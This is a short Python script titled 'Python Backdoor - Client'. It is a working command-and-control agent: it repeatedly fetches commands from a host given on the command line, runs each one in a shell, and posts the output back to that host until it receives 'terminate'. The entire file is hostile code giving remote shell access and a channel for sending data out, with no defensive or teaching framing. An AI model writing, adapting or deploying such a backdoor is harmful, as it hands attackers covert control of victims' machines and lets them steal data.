#
# Python Backdoor - Client
#

import requests, os, subprocess, time, sys

host = sys.argv[1]
url = f"http://{host}"

while True:
    req = requests.get(url)
    c2_command = req.text
    if 'terminate' in c2_command:
        break
    else:
        CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        post_response = requests.post(url=url, data=CMD.stdout.read())
